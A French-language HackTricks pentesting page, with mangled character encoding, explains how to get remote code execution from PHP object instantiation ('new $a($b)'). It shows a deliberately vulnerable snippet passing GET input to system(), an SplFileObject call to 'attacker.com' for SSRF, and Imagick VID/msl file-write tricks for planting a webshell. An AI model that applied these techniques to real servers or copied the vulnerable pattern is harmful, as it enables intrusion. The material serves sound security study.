# PHP - RCE en abusant de la crÃ©ation d'objet : new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Introduction

Dans la situation oÃ¹ vous pouvez crÃ©er un nouvel objet arbitraire comme `new $_GET["a"]($_GET["a"])`, vous pourriez Ãªtre en mesure d'obtenir une RCE, et [**cet article**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expose diffÃ©rentes faÃ§ons d'obtenir une RCE.

## RCE via des classes personnalisÃ©es ou l'autoloading

Dans la construction `new $a($b)`, la **variable `$a` reprÃ©sente le nom de la classe** pour laquelle l'objet sera crÃ©Ã©, et la variable **`$b` reprÃ©sente le premier argument** qui sera passÃ© au constructeur de l'objet.

Si `$a` et `$b` proviennent de GET/POST, ils peuvent Ãªtre **des chaÃ®nes de caractÃ¨res ou des tableaux de chaÃ®nes de caractÃ¨res**. S'ils proviennent de **JSON** ou d'ailleurs, ils **peuvent avoir d'autres types**, tels que des objets ou des boolÃ©ens.

ConsidÃ©rons l'exemple suivant :
```php
class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans ce code, vous pouvez dÃ©finir `$a` sur `App` ou `App2` et `$b` sur `uname -a`. AprÃ¨s cela, la commande `uname -a` sera exÃ©cutÃ©e.

Lorsqu'il n'y a pas de classes exploitables dans votre application, ou que la classe nÃ©cessaire se trouve dans un fichier sÃ©parÃ© qui n'est pas inclus par le code vulnÃ©rable, vous pouvez jeter un coup d'Å“il aux fonctions d'autoload.

Les **fonctions d'autoload** sont dÃ©finies en enregistrant des rappels via `spl_autoload_register` ou en dÃ©finissant `__autoload`. Elles sont appelÃ©es lorsqu'une instance d'une classe inconnue est en train d'Ãªtre crÃ©Ã©e.
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
        include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
        include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
Selon la version de PHP et le code dans les fonctions d'autoloading, il peut exister des moyens d'obtenir une exÃ©cution de code Ã  distance via l'autoloading.

## RCE via les classes intÃ©grÃ©es

Lorsque vous n'avez pas de classes personnalisÃ©es et d'autoloading, vous pouvez vous fier uniquement aux **classes PHP intÃ©grÃ©es**.

Il existe de 100 Ã  200 classes PHP intÃ©grÃ©es. Le nombre d'entre elles dÃ©pend de la version de PHP et des extensions installÃ©es. Toutes les classes intÃ©grÃ©es peuvent Ãªtre rÃ©pertoriÃ©es via la fonction `get_declared_classes`, ainsi que les classes personnalisÃ©es :
```php
var_dump(get_declared_classes());
```
Des classes avec des constructeurs utiles peuvent Ãªtre trouvÃ©es via [l'API de rÃ©flexion](https://www.php.net/manual/en/book.reflection.php).

Affichage des constructeurs et de leurs paramÃ¨tres en utilisant l'API de rÃ©flexion: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

Si vous contrÃ´lez **plusieurs paramÃ¨tres de constructeur et pouvez appeler des mÃ©thodes arbitraires** par la suite, il existe de nombreuses faÃ§ons d'obtenir une exÃ©cution de code Ã  distance. Mais si vous ne pouvez passer **qu'un seul paramÃ¨tre et n'avez aucun appel** Ã  l'objet crÃ©Ã©, il n'y a **presque rien**.

Je connais seulement trois faÃ§ons d'obtenir quelque chose de `new $a($b)`.

### **SSRF + dÃ©sÃ©rialisation Phar**

La classe `SplFileObject` implÃ©mente un constructeur qui permet la connexion Ã  n'importe quelle URL locale ou distante:
```
new SplFileObject('http://attacker.com/');
```
Cela permet SSRF. De plus, les SSRF en PHP < 8.0 peuvent Ãªtre transformÃ©es en dÃ©sÃ©rialisations via des techniques avec le protocole Phar.

### **Exploitation de PDOs**

La classe PDO a un autre constructeur intÃ©ressant :
```php
new PDO("sqlite:/tmp/test.txt")
```
Le constructeur `PDO` accepte des chaÃ®nes DSN, ce qui nous permet de **se connecter Ã  n'importe quelle base de donnÃ©es locale ou distante** en utilisant les **extensions de base de donnÃ©es installÃ©es**. Par exemple, l'extension SQLite peut crÃ©er des fichiers vides.

### **SoapClient/SimpleXMLElement XXE**

Dans PHP â‰¤ 5.3.22 et â‰¤ 5.4.12, le constructeur de SoapClient Ã©tait **vulnÃ©rable Ã  XXE**. Le constructeur de SimpleXMLElement Ã©tait Ã©galement vulnÃ©rable Ã  XXE, mais il nÃ©cessitait libxml2 < 2.9.

## RCE via l'extension Imagick

En vÃ©rifiant les **dÃ©pendances** du **projet** que vous essayez d'exploiter, vous pouvez trouver des **nouvelles classes** qui pourraient Ãªtre **abusÃ©es pour exÃ©cuter des commandes** en crÃ©ant un nouvel objet. Dans ce cas, **Imagick** s'est avÃ©rÃ© utile Ã  cette fin.

### Analyseur VID

L'analyseur VID permet d'Ã©crire un contenu arbitraire dans un chemin arbitraire Ã  l'intÃ©rieur du systÃ¨me de fichiers, ce qui permettrait Ã  un attaquant d'Ã©crire un PHPshell dans un dossier accessible depuis la page web et d'obtenir une RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### Analyseur VID + TÃ©lÃ©chargement de fichiers

Lorsqu'un fichier est tÃ©lÃ©chargÃ© sur PHP, il est temporairement stockÃ© dans `/tmp/phpXXXXXX`. L'analyseur VID d'Imagick avec le protocole **msl** permet de **spÃ©cifier des caractÃ¨res gÃ©nÃ©riques dans les chemins de fichiers** (de sorte que le fichier tÃ©lÃ©chargÃ© temporaire peut Ãªtre facilement accessible) et de **le copier dans n'importe quel emplacement arbitraire**.\
C'est une autre faÃ§on d'obtenir l'Ã©criture de fichiers arbitraires dans le systÃ¨me de fichiers :

![](<../../../.gitbook/assets/image (159).png>)

### Plantage PHP + Brute Force

Le [**writeup original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expliquait une autre faÃ§on d'obtenir une RCE en **tÃ©lÃ©chargeant des fichiers avec un contenu spÃ©cifique** et en faisant **planter le serveur avant qu'il ne supprime** ce fichier, puis en **bruteforÃ§ant le nom** du fichier temporaire jusqu'Ã  ce qu'**Imagick exÃ©cute du code PHP arbitraire**.

Cependant, apparemment, le **truc du plantage** dÃ©couvert ne **fonctionnait que dans une ancienne version d'ImageMagick**.

## RÃ©fÃ©rences

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
